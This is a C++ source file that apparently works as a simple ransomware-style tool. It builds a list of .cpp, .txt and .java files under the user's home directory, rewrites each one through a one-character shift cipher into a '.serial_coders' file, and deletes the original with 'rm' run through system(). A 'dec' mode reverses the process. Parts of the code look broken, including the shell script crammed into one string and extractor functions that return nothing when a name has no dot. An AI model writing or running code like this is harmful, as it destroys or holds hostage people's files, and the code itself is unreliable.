#include <bits/stdc++.h>
using namespace std;

int key=1;

fstream fin,fout,lin;
string file_name,ext;

void decrypt(string str,int key){
    int i;
    char a='a';
    for(i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a+key)%128;
        fout<<a;      
    }
}

void encrypt(string str,int key){
    int i;
    char a='a';
    for(i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a-key)%128;
        fout<<a;      
    }
}

string file_name_extractor(string str)
{
    int i;
    for(i=0;i<str.size();i++)
    {
        if(str[i]=='.')
        {
            return str.substr(0,i);
        }
    }   
}

string extention_extractor(string str)
{
    int i;
    for(i=0;i<str.size();i++)
    {
        if(str[i]=='.')
        {
            return str.substr(i+1,str.size()-i-1);
        }
    }   
}

void encrypter(string input)
{
    string str;
    
    file_name+=".serial_coders";
    fout.open(file_name.c_str(),ios::out );
    
    str=extention_extractor(input);
    encrypt(ext,1);
    fout<<endl;
    
    while(true)
	{
	    getline(fin,str);
	    encrypt(str,key);
	    if(fin.eof()){
	        break;
	    }
	    fout<<endl;
	}
	fout.close();
}

void decrypter(string input)
{
    string str;
    
    //add orig extention to file_name
	getline(fin,str);
	char a;
	file_name+=".";
	for(int i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a+key)%128;
        file_name+=a;     
    }
    fout.open(file_name.c_str(),ios::out );
    
    while(true)
	{
	    getline(fin,str);
	    decrypt(str,key);
	    if(fin.eof()){
	        break;
	    }
	    fout<<endl;
	}
	fout.close();
}

void list_gen(){

     string command = " \
        #get location of current dir \
        SOURCE=""${BASH_SOURCE[0]}"" \
        while [ -h ""$SOURCE"" ]; do # resolve $SOURCE until the file is no longer a symlink \
          DIR=""$( cd -P ""$( dirname ""$SOURCE"" )"" && pwd )"" \
          SOURCE=""$(readlink ""$SOURCE"")"" \
          [[ $SOURCE != /* ]] && SOURCE=""$DIR/$SOURCE"" # if $SOURCE was a relative symlink, we need to resolve it  \
        done \
        DIR=""$( cd -P ""$( dirname ""$SOURCE"" )"" && pwd )"" \
        dir_pres=$DIR \
        if [ -f $dir_pres/files ] ; then \
        rm $dir_pres/files \
        fi \
        cd $HOME \
        file0=""*.cpp */*.cpp */*/*.cpp */*/*/*.cpp */*/*/*/*.cpp "" \
        file1=""*.txt */*.txt */*/*.txt */*/*/*.txt */*/*/*/*.txt"" \
        file2=""*.java */*.java */*/*.java */*/*/*.java */*/*/*/*.java"" \
        for i in $file0 $file1 $file2; do [ -f ""$i"" ] && echo ""$HOME$i"" >>$dir_pres/files ; done | sort \
        if [ -f $dir_pres/encrypted_list ] ; then \
            rm $dir_pres/encrypted_list \
            fi \
        file3=""*.serial_coders */*.serial_coders */*/*.serial_coders */*/*/*.serial_coders */*/*/*/*.serial_coders"" \
        for i in $file3; do [ -f ""$i"" ] && echo ""$HOME$i"" >>$dir_pres/encrypted_list ; done | sort \
        ";

    system(command.c_str());
}

void enc_dec(string input){
    string str;
	
	if(input==""){
	    return;
	}
	
	fin.open(input.c_str(),ios::in);
	ext=extention_extractor(input);
	file_name=file_name_extractor(input);
	
	if(ext=="serial_coders")//to be decrypted
	{
	    decrypter(input);
	}
	else//to be encrypted
	{
	    encrypter(input);
	}
	
	input="\""+input+"\"";
    str=(string)"rm "+input+" ";
    system(str.c_str());
    
	fin.close();
	fout.close();
}

void list_reader(string task){
    if(task=="enc")
	{
	    lin.open("files",ios::in);
	    if(!lin){
	        exit(0);
	    }
	}
	else
	{
	    lin.open("encrypted_list",ios::in);
	    if(!lin){
	        exit(0);
	    }
	}
	
	string str,command;
    while(true)
	{
	    if(lin.eof()){
	        break;
	    }
	    getline(lin,str);
	    enc_dec(str);
	        
	}
	lin.close();
}

int main(int argc, char *argv[])
{
	string input,str;
	
	list_gen();
	
	input=argv[1];
	if(input=="enc")
	{
	    list_reader("enc");
	}
	else if(input=="dec")
	{
	    list_reader("dec");
	}
	else{
	    return 0;
	}

	fin.close();
	
	system("");
	cout<<"success\n";
	return 0;
}
